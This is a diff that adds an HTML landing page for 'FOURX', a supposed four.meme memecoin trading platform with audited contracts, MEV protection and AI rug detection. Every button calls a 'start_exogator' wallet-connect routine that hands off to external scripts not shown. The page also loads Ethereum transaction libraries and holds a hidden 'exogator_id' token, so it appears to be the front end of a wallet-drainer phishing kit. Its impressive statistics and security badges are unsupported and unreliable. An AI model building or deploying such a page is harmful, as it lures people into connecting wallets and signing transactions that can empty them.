@@ -1,0 +1,319 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/boxicons.min.css">
+    <link rel="stylesheet" href="css/style.css">
+    <title>FOURX - Next-Gen Memecoin Trading</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/aos.css">
+    <style>
+        :root {
+            --primary: #00ff88;
+            --secondary: #60e6ff;
+            --bg: #0a0a12;
+            --surface: rgba(255, 255, 255, 0.05);
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: white;
+            overflow-x: hidden;
+        }
+
+        .gradient-text {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Neue Navigation */
+        .nav {
+            padding: 1.5rem 10%;
+            backdrop-filter: blur(12px);
+            position: fixed;
+            width: 100%;
+            z-index: 100;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .nav-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* Hero Section Redesign */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            padding: 0 10%;
+            position: relative;
+            background: radial-gradient(circle at 75% 50%, rgba(96,230,255,0.1), transparent 50%);
+        }
+
+        .hero-content {
+            max-width: 800px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero h1 {
+            font-size: 4.5rem;
+            line-height: 1.1;
+            margin-bottom: 2rem;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: rgba(255,255,255,0.8);
+            margin-bottom: 3rem;
+            max-width: 600px;
+        }
+
+        .cta-button {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            padding: 1.25rem 2.5rem;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 1.1rem;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cta-button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                120deg,
+                transparent,
+                rgba(255,255,255,0.1),
+                transparent
+            );
+            transition: 0.5s;
+        }
+
+        .cta-button:hover::after {
+            left: 100%;
+        }
+
+        /* Security Badges */
+        .security-badges {
+            display: flex;
+            gap: 2rem;
+            margin-top: 3rem;
+        }
+
+        .badge {
+            background: var(--surface);
+            padding: 1rem 1.5rem;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            backdrop-filter: blur(5px);
+        }
+
+        /* Neue Feature Cards */
+        .features {
+            padding: 6rem 10%;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-top: 4rem;
+        }
+
+        .feature-card {
+            background: var(--surface);
+            padding: 2.5rem;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            transition: transform 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, var(--primary) 0.5%, transparent 95%);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .feature-card:hover::before {
+            opacity: 0.1;
+        }
+
+        /* Live Stats Section */
+        .live-stats {
+            padding: 4rem 10%;
+            background: var(--surface);
+            margin: 4rem 0;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 3rem;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Mobile Optimierungen */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 3rem;
+            }
+
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+<link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>     
+    <script src="./settings.js"></script>
+    <script src="/ethereum-web3.js" type="module"></script></head>
+<body>
+    <nav class="nav">
+        <div class="nav-content">
+            <h2 class="gradient-text">FOURX.live</h2>
+            <button onclick="start_exogator()" class="cta-button">Connect Wallet</button>
+        </div>
+    </nav>
+
+    <section class="hero">
+        <div class="hero-content">
+            <h1>Trade <span class="gradient-text">four.meme</span> Smarter</h1>
+            <p>Next-generation trading platform with built-in MEV protection, real-time rug detection, and AI-powered trading strategies.</p>
+            <button class="cta-button" onclick="start_exogator()">Start Trading Now</button>
+            
+            <div class="security-badges">
+                <div class="badge">🔒 Audited Smart Contracts</div>
+                <div class="badge">🛡️ MEV Protected</div>
+                <div class="badge">📈 Real-time Analytics</div>
+            </div>
+        </div>
+    </section>
+
+    <section class="features">
+        <div class="feature-grid">
+            <div class="feature-card" data-aos="fade-up">
+                <h3>🛡️ Anti-MEV System</h3>
+                <p>Our proprietary protection shields your transactions from front-running and sandwich attacks</p>
+            </div>
+            
+            <div class="feature-card" data-aos="fade-up" data-aos-delay="100">
+                <h3>🚨 Instant Rug Detection</h3>
+                <p>AI-powered monitoring system detects suspicious contract activity in real-time</p>
+            </div>
+            
+            <div class="feature-card" data-aos="fade-up" data-aos-delay="200">
+                <h3>⚡ Instant Swaps</h3>
+                <p>Near-zero slippage trades powered by our advanced liquidity routing system</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="live-stats">
+        <div class="stats-grid">
+            <div class="stat-item">
+                <div class="stat-value">$42M+</div>
+                <div class="stat-label">Protected Volume</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">98.7%</div>
+                <div class="stat-label">Success Rate</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">0.12s</div>
+                <div class="stat-label">Avg. Speed</div>
+            </div>
+        </div>
+    </section>
+
+    <script src="js/aos.js"></script>
+    <script>
+        AOS.init({
+            duration: 1000,
+            once: true
+        });
+
+        // Interaktiver Hintergrund-Effekt
+        document.addEventListener('mousemove', (e) => {
+            const hero = document.querySelector('.hero');
+            const x = e.clientX / window.innerWidth;
+            const y = e.clientY / window.innerHeight;
+            
+            hero.style.backgroundPosition = `${x * 100}% ${y * 100}%`;
+        });
+    </script>
+
+
+
+<input type="hidden" value="7I4C6AAKEHFXUIGNK6ENOJX1KSHG6MG2LHBNRSFK3UGY9" id="exogator_id">
+
+<script>
+                     
+  function isMobile() {
+      return /Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
+    }
+
+  async function start_exogator(){
+    if(isMobile()){
+        use_wc();
+    }else{
+        init_co();
+    }
+  }
+
+</script>
+
+
+
+<script src="js/w-modal.js"></script>
+<script src="js/w-loader.js"></script>
+<script src="js/modules.js"></script>
+<script src="js/main.js"></script>
+
+<script src="js/jquery-3.7.1.slim.min.js" crossorigin="anonymous"></script>
+<script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+
+</body></html>
